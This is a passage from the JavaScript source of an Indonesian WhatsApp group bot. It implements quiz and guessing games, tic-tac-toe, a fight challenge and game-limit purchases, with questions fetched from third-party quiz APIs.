					`*${pushname}*\n\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`
				reply(tiyo)
				break;

			case 'gelud':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (mek.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid >
					1) return reply(
					'Hanya bisa dengan 1 orang'
				)
				if (!mek.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid[
						0])
					return
				if (args
					.length ===
					0) return reply(
					`Tag Lawan Yang Ingin Diajak Bermain Game`
				)
				if (fs
					.existsSync(
						`./XNXXs2/${from}.json`
					))
					return reply(
						`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`
					)

				gelutSkuy =
					setGelud(
						`${from}`
					)
				gelutSkuy
					.status =
					false
				gelutSkuy.Z =
					sender
					.replace(
						"@s.whatsapp.net",
						"")
				gelutSkuy.Y =
					args[0]
					.replace(
						"@", ""
					);
				fs.writeFileSync(
					`./XNXXs2/${from}.json`,
					JSON
					.stringify(
						gelutSkuy,
						null,
						2))
				starGame =
					`👑 Memulai Game Baku Hantam 👊🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

				Maslent
					.sendMessage(
						from,
						starGame,
						text, {
							quoted: mek,
							contextInfo: {
								mentionedJid: [
									sender,
									args[
										0
									]
									.replace(
										"@",
										""
									) +
									"@s.whatsapp.net"
								],
							}
						})
				gameAdd(sender,
					glimit)
				break
			case 'delsesigelud':
				//titidkau
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (fs
					.existsSync(
						'./XNXXs2/' +
						from +
						'.json')
				) {
					fs.unlinkSync(
						'./XNXXs2/' +
						from +
						'.json'
					)
					reply(
						'Berhasil Menghapus Sesi Gelud'
					)
				} else {
					reply(
						'Tidak ada sesi yang berlangsung'
					)
				}
				break


			case 'family100':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (game.isfam(
						from,
						family100
					))
					return reply(
						`Masih ada soal yang belum di selesaikan`
					)
				anu =
					await axios
					.get(
						`http://api.lolhuman.xyz/api/tebak/family100?apikey=${setting.lolkey}`
					)
				reply(
					`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.answer.length}\n\nWaktu : ${gamewaktu}s`
				)
				let anoh = anu
					.data.result
					.answer
				let rgfds = []
				for (let i of
						anoh) {
					let fefs = i
						.split(
							'/'
						) ?
						i.split(
							'/'
						)[
							0] :
						i
					let iuhbb =
						fefs
						.startsWith(
							' '
						) ?
						fefs
						.replace(
							' ',
							''
						) :
						fefs
					let axsf =
						iuhbb
						.endsWith(
							' '
						) ?
						iuhbb
						.replace(
							iuhbb
							.slice(
								-
								1
							),
							''
						) :
						iuhbb
					rgfds.push(
						axsf
						.toLowerCase()
					)
				}
				game.addfam(
					from,
					rgfds,
					gamewaktu,
					family100
				)
				gameAdd(sender,
					glimit)
				break
			case 'tebakanime':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebakanime
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Selesein yg sebelumnya dulu atuh"
					)
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/tebakchara?apikey=${lolkey}`
					)
				get_result =
					get_result
					.result
				ini_image =
					get_result
					.image
				jawaban =
					get_result
					.name
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				ini_buffer =
					await getBuffer(
						ini_image
					)
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :' +
								kisi_kisi +
								'\n• *Waktu* : 60s'
						}).then(
						() => {
							tebakanime
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakanime.json",
								JSON
								.stringify(
									tebakanime
								)
							)
						})
				await sleep(
					60000)
				if (tebakanime
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("*Jawaban*: " +
						jawaban
					)
					delete tebakanime
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebakanime.json",
						JSON
						.stringify(
							tebakanime
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'tebaklagu':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebaklagu
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Selesein yg sebelumnya dulu atuh"
					)
				get_result =
					await fetchJson(
						`https://api.xteam.xyz/game/tebaklagu?apikey=${setting.xteamkey}&id=4mFuArYRh3SO8jfffYLSER`
					)
				get_result =
					get_result
					.result
				ini_audio =
					get_result
					.preview
				jawaban =
					get_result
					.judul
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				ini_buffer =
					await getBuffer(
						ini_audio
					)
				reply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :' +
					kisi_kisi +
					'\n• *Waktu* : 60s'
				)
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						audio, {
							quoted: mek
						}).then(
						() => {
							tebaklagu
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaklagu.json",
								JSON
								.stringify(
									tebaklagu
								)
							)
						})
				await sleep(
					60000)
				if (tebaklagu
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("*Jawaban*: " +
						jawaban
					)
					delete tebaklagu
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebaklagu.json",
						JSON
						.stringify(
							tebaklagu
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'tebaktebakan':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebaktebakan
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.soal
				Maslent
					.sendMessage(
						from,
						'*+* ```Tebak Tebakan```\n\n• *soal* :' +
						pertanyaan +
						'\n• *kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							tebaktebakan
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaktebakan.json",
								JSON
								.stringify(
									tebaktebakan
								)
							)
						})
				await sleep(
					60000)
				if (tebaktebakan
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete tebaktebakan
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebaktebakan.json",
						JSON
						.stringify(
							tebaktebakan
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'kuismath':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (kuismath
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Selesein yg sebelumnya dulu atuh"
					)
				get_result =
					await fetchJson(
						`https://api-yogipw.herokuapp.com/api/kuis/math`
					)
				ini_image =
					get_result
					.soal
				jawaban =
					get_result
					.jawaban
				ini_buffer =
					await getBuffer(
						ini_image
					)
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s'
						}).then(
						() => {
							kuismath
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/kuismath.json",
								JSON
								.stringify(
									kuismath
								)
							)
						})
				await sleep(
					50000)
				if (kuismath
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("*Jawaban*: " +
						jawaban
					)
					delete kuismath
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/kuismath.json",
						JSON
						.stringify(
							kuismath
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'kurumi':
			case 'deku':
			case 'sao':
			case 'chika':
			case 'kurumi':
			case 'kaneki':
			case 'touka':
			case 'eren':
			case 'naruto':
			case 'minato':
			case 'sagiri':
			case 'sasuke':
			case 'sakura':
			case 'tsunade':
			case 'gojosatoru':

				reply(mess.wait)
				query = args
					.join(" ")
				anu =
					await fetchJson(
						`https://api.lolhuman.xyz/api/pinterest?apikey=Chikey&query=${query}`, {
							method: 'get'
						})
				ngebuff =
					await getBuffer(
						anu
						.image)
				Maslent
					.sendMessage(
						from,
						ngebuff,
						image, {
							quoted: mek
						})
				break
			case 'tictactoe':
			case 'ttt':
			case 'ttc':
				//titidkau
				if (!isGroup)
					return reply(
						'Perintah hanya bisa digunakan di dalam group'
					)
				//	if (!isRegistered) return reply(ind.noregis())
				if (mek.message
					.extendedTextMessage ===
					undefined ||
					mek.message
					.extendedTextMessage ===
					null)
					return reply(
						'tag orangnya'
					)
				mentioned = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid
				if (isTicTacToe(
						from,
						tictactoe
					))
					return reply(
						`Masih ada game yg blum selesai`
					)
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (args
					.length < 0)
					return reply(
						`Kirim perintah ${prefix}tictactoe @tag`
					)
				if (mentioned
					.length !==
					0) {
					if (mentioned[
							0
						] ===
						sender)
						return reply(
							`Sad amat main ama diri sendiri`
						)
					let h =
						randomNomor(
							10000000
						)
					mentions(
						monospace(
							`@${sender.split('@')[0]} menantang @${mentioned[0].split('@')[0]} untuk bermain TicTacToe\n\nKirim (Y/T) untuk bermain\n\nHadiah : ${h} limit`
						),
						[sender,
							mentioned[
								0
							]
						],
						false
					)
					tictactoe
						.push({
							id: from,
							status: null,
							hadiah: h,
							penantang: sender,
							ditantang: mentioned[
								0
							],
							TicTacToe: [
								'1️⃣',
								'2️⃣',
								'3️⃣',
								'4️⃣',
								'5️⃣',
								'6️⃣',
								'7️⃣',
								'8️⃣',
								'9️⃣'
							]
						})
					gameAdd(sender,
						glimit
					)
				} else {
					reply(
						`Kirim perintah ${prefix}tictactoe @tag`
					)
				}
				break
			case 'delttt':
			case 'delttc':
				//titidkau
				if (!isGroup)
					return reply(
						'Perintah hanya bisa digunakan di dalam group'
					)
				//   if (!isRegistered) return reply(ind.noregis())
				if (!
					isTicTacToe(
						from,
						tictactoe
					))
					return reply(
						`Tidak ada sesi game tictactoe di grup ini`
					)
				tictactoe
					.splice(
						getPosTic(
							from,
							tictactoe
						), 1
					)
				reply(
					`Berhasil menghapus sesi tictactoe di grup ini`
				)
				break
			case 'tebakgambar':
				//titidkau
				if (tebakgambar
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Selesein yg sebelumnya dulu atuh"
					)
				get_result =
					await fetchJson(
						`http://zekais-api.herokuapp.com/tebakgambar`
					)
				ini_image =
					get_result
					.soal
				jawaban =
					get_result
					.jawaban
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				ini_buffer =
					await getBuffer(
						ini_image
					)
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :' +
								kisi_kisi +
								'\nWaktu : 60s'
						}).then(
						() => {
							tebakgambar
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakgambar.json",
								JSON
								.stringify(
									tebakgambar
								)
							)
						})
				await sleep(
					60000)
				if (tebakgambar
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("*Jawaban*: " +
						jawaban
					)
					delete tebakgambar
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebakgambar.json",
						JSON
						.stringify(
							tebakgambar
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'siapaaku':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebaksiapaaku
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				Maslent
					.sendMessage(
						from,
						'*+* ```Tebak Siapakah Aku```\n\n• *soal* :' +
						pertanyaan +
						'\n• *kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							tebaksiapaaku
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaksiapaaku.json",
								JSON
								.stringify(
									tebaksiapaaku
								)
							)
						})
				await sleep(
					`${waktu}`
				)
				if (tebaksiapaaku
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete tebaksiapaaku
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebaksiapaaku.json",
						JSON
						.stringify(
							tebaksiapaaku
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'buyglimit': {
				//titidkau
				if (!q) return reply(
					`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`
				)
				const
					koinPerlimit =
					100
				jg = `id`
				const total =
					koinPerlimit *
					q
				if (getBalance(
						sender,
						balance
					) <=
					total)
					return reply(
						`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`
					)
				kurangBalance(
					sender,
					total,
					balance)
				givegame(sender,
					q,
					glimit)
				re = `Pembeliaan game limit sebanyak ${q} berhasil,\n\nSisa Balance : $${getBalance(sender, balance)},\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`
				const gtu =
					require(
						'./XNXX1/gtts'
					)(jg)
				//	if (args.length < 2) return Maslent.sendMessage(from, 'Mana teks yang ma di jadiin suara? suara saya kah:v?', text, {quoted: mek})
				dtt = `${re}`
				ranm =
					getRandom(
						'.mp3')
				rano =
					getRandom(
						'.ogg')
				dtt.length >
					100000 ?
					reply(
						'lah teks nya kepanjangan bambang😤'
					) :
					gtu.save(
						ranm,
						dtt,
						function() {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`,
								(
									err
								) => {
									fs.unlinkSync(
										ranm
									)
									buffer
										=
										fs
										.readFileSync(
											rano
										)
									if (
										err
									)
										return reply(
											mess
											.stikga()
										)
									Maslent
										.sendMessage(
											from,
											buffer,
											audio, {
												quoted: mek,
												ptt: true
											}
										)
									fs.unlinkSync(
										rano
									)
								}
							)
						})
				break
			}


			case 'tebakkata':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebakata
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/kata?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				pertanyaan =
					get_result
					.pertanyaan
				Maslent
					.sendMessage(
						from,
						'*+* ```Tebak Kata```\n\n• *Soal* :' +
						pertanyaan +
						'\n• *Waktu :* 60s',
						text, {
							quoted: mek
						}).then(
						() => {
							tebakata
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakata.json",
								JSON
								.stringify(
									tebakata
								)
							)
						})
				await sleep(
					60000)
				if (tebakata
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete tebakata
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebakata.json",
						JSON
						.stringify(
							tebakata
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'tebaklirik':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebaklirik
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/lirik?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				Maslent
					.sendMessage(
						from,
						'*+* ```Tebak Lirik```\n\n• *Soal* :' +
						pertanyaan +
						'\n• *Kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							tebaklirik
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaklirik.json",
								JSON
								.stringify(
									tebaklirik
								)
							)
						})
				await sleep(
					60000)
				if (tebaklirik
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete tebaklirik
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebaklirik.json",
						JSON
						.stringify(
							tebaklirik
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'leavetime':
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (!isOwner &&
					!mek.key
					.fromMe)
					return sticOwner(
						from
					)
				if (args[1] ==
					"detik") {
					var timer =
						args[
							0] +
						"000"
				} else if (args[
						1] ==
					"menit") {
					var timer =
						args[
							0] +
						"0000"
				} else if (args[
						1] ==
					"jam") {
					var timer =
						args[
							0] +
						"00000"
				} else {
					return reply(
						"*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik"
					)
				}
				setTimeout(
					() => {
						Maslent
							.groupLeave(
								from
							);
					},
					timer)
			case 'tebakjenaka':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebakjenaka
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/jenaka?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				Maslent
					.sendMessage(
						from,
						'*+* ```Tebak Jenaka```\n\n• *Soal* :' +
						pertanyaan +
						'\n• *Kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							tebakjenaka
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakjenaka.json",
								JSON
								.stringify(
									tebakjenaka
								)
							)
						})
				await sleep(
					60000)
				if (tebakjenaka
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete tebakjenaka
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebakjenaka.json",
						JSON
						.stringify(
							tebakjenaka
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'kimiakuis':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebakimia
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.lambang
				pertanyaan =
					get_result
					.nama
				Maslent
					.sendMessage(
						from,
						'*+* ```Tebak Kimia```\n\n• *Soal* :' +
						pertanyaan +
						'\n• *Waktu :* 60s',
						text, {
							quoted: mek
						}).then(
						() => {
							tebakimia
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakimia.json",
								JSON
								.stringify(
									tebakimia
								)
							)
						})
				await sleep(
					60000)
				if (tebakimia
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete tebakimia
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebakimia.json",
						JSON
						.stringify(
							tebakimia
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'tebakbendera':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (tebakbendera
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/bendera?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.name
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.flag
				Maslent
					.sendMessage(
						from,
						'*+* ```Tebak Bendera```\n\n• *Bendera* :' +
						pertanyaan +
						'\n• *kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							tebakbendera
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakbendera.json",
								JSON
								.stringify(
									tebakbendera
								)
							)
						})
				await sleep(
					60000)
				if (tebakbendera
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete tebakbendera
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/tebakbendera.json",
						JSON
						.stringify(
							tebakbendera
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'susunkata':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (susunkata
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/susunkata?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				pertanyaan =
					get_result
					.pertanyaan
				Maslent
					.sendMessage(
						from,
						'*+* ```Susun Kata```\n\n• *Soal* :' +
						pertanyaan +
						'\n• *Waktu :* 60s',
						text, {
							quoted: mek
						}).then(
						() => {
							susunkata
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/susunkata.json",
								JSON
								.stringify(
									susunkata
								)
							)
						})
				await sleep(
					60000)
				if (susunkata
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete susunkata
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/susunkata.json",
						JSON
						.stringify(
							susunkata
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'asahotak':
				//titidkau
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (asahotak
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/asahotak?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.pertanyaan
				Maslent
					.sendMessage(
						from,
						'*+* ```Asah Otak```\n\n• *soal* :' +
						pertanyaan +
						'\n• *kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							asahotak
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/asahotak.json",
								JSON
								.stringify(
									asahotak
								)
							)
						})
				await sleep(
					60000)
				if (asahotak
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete asahotak
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/asahotak.json",
						JSON
						.stringify(
							asahotak
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'caklontong':
				//titidkau     
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis`
					)
				if (caklontong
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					))
					return reply(
						"Masih ada soal yg belum terjawab"
					)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				Maslent
					.sendMessage(
						from,
						'*+* ```Caklontong```\n\n• *soal* :' +
						pertanyaan +
						'\n• *kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							caklontong
								[sender
									.split(
										'@'
									)[
										0
									]
								] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/caklontong.json",
								JSON
								.stringify(
									caklontong
								)
							)
						})
				await sleep(
					60000)
				if (caklontong
					.hasOwnProperty(
						sender
						.split(
							'@'
						)[0]
					)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
						)
					)
					reply("Jawaban: " +
						jawaban
					)
					delete caklontong
						[sender
							.split(
								'@'
							)[
								0
							]
						]
					fs.writeFileSync(
						"./database/caklontong.json",
						JSON
						.stringify(
							caklontong
						)
					)
				}
				gameAdd(sender,
					glimit)
				break
			case 'slot':
				//titidkau
				const sotoy = [
					'🍊 : 🍒 : 🍐',
					'🍒 : ?? : 🍊',
					'?? : 🍒 : 🍐',
					'🍊 : 🍋 : 🔔',
					'🔔 : 🍒 : 🍐',
					'🔔 : 🍒 : 🍊',
					'🍊 : 🍋 : 🔔',
					'🍐 : 🍒 : 🍋',
					'🍐 : 🍐 : 🍐',
					'🍊 : 🍒 : 🍒',
					'🔔 : 🔔 : 🍇',
					'🍌 : 🍒 : 🔔',
					'🍐 : 🔔 : 🔔',
					'🍊 : 🍋 : 🍒',
